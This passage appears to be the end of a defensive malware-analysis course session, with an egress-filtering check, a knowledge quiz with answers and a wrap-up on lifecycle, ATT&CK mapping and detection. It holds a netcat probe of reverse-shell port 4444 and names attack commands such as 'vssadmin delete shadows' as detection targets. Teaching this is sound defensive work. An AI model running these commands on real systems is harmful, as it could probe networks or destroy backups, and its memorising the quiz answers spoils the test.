nc -zv example.com 4444    # in a hardened net this should be BLOCKED — killing reverse shells

    You should see: two controls — macro-blocking and egress filtering — defeat a large fraction of real intrusions (delivery/execution and C2). Cheap, high-impact, and the ones orgs most often skip.

    A barrier at every stage

    Defence in depth beats novelty. You cannot predict the next sample, but you can guarantee it must pass delivery, execution, persistence, C2, and impact controls. Offline backups + egress filtering + app-allow-listing + patching stop most of what you will ever see.

    S07 · P27Assess · 6 questions⏱ 10 min

    Knowledge Check

    Six questions across the session. Answer before you reveal — each explains the reasoning, not just the letter.

    Q1What is the defining difference between a worm and a virus?

    • A worm encrypts files; a virus steals credentials
    • A worm is fileless; a virus is always on disk
    • A worm spreads by itself across the network; a virus needs a user to run an infected file
    • There is no real difference — the terms are interchangeable

    Q2Why do you always perform static analysis before dynamic analysis?

    • Static analysis is more accurate than dynamic
    • Static analysis never executes the file, so it carries no risk — you learn safely first
    • Dynamic analysis is illegal without static analysis first
    • Static analysis unpacks the malware automatically

    Q3During static analysis a PE has almost no imports — just LoadLibrary and GetProcAddress. What does this most likely indicate?

    • The file is benign — it does nothing
    • The file is a document, not an executable
    • The file is a rootkit
    • The file is packed/obfuscated — real imports are hidden until runtime

    Q4Which single detection best catches credential dumping (Mimikatz-style)?

    • Sysmon Event ID 10 — a process opening lsass.exe with a read/dump access mask
    • Event 4624 — a successful logon
    • A file hash blocklist
    • Sysmon Event ID 3 — any network connection

    Q5You want the most durable detection for a malware family. Which indicator do you invest in?

    • The exact file hash — it is precise
    • The dropped filename
    • The behaviour / TTP (e.g. Office spawning encoded PowerShell) — expensive to change
    • The compile timestamp

    Q6Why is a detection rule on 'vssadmin delete shadows' so valuable against ransomware?

    • It is the encryption command itself
    • It runs before encryption to kill backups — catching it can save the data
    • It is the ransom-note filename
    • It only appears in fileless malware
    Score yourself

    5–6 right: you can run the workflow — go analyse a real sample in a sandbox. 3–4: re-read the static/dynamic and IOC pages. <3: rewatch the lifecycle and SOC-flip diagrams — they anchor everything else.

    S07 · P28Wrap-up⏱ 4 min

    Session 7 — What You Keep

    Ten things that outlast the tool names. Malware changes weekly; this workflow does not.

    The durable core

    You sat in both chairs on one sample: built it, analysed it two ways, mapped it, and wrote the rules to catch it. The tools will change; the discipline — classify by behaviour, static-then-dynamic, map to ATT&CK, detect the behaviour — is what you keep.

    1. Classify by behaviour, not by name. Propagation × purpose places any sample and tells you what evidence to hunt.
    2. One lifecycle fits all malware. Delivery → execution → persistence → C2 → actions — and every stage leaves evidence.
    3. Reverse = victim dials out. RATs beat firewalls with outbound C2; egress filtering and beacon detection catch them.
    4. Worm = no click = outbreak. Contain with segmentation and patching; you cannot out-click an exponential curve.
    5. Ransomware is loud on purpose. Mass file-rewrite + vssadmin delete shadows is one of the most catchable behaviours there is.
    6. You cannot hash what is not on disk. Fileless/LOLbins force behavioural detection — command lines and process trees.
    7. Static first (safe), dynamic second (isolated). Static says what it is; dynamic proves what it does; packing forces the truth out at runtime.
    8. Map to ATT&CK. A mapped behaviour is a detection checklist every analyst on earth can read.
    9. Climb the Pyramid of Pain. Block the hash today; detect the behaviour forever.
    10. Analysis is detection engineering. Every behaviour you watched has an event ID — YARA for the file, Sigma for the behaviour, a report that ships both.
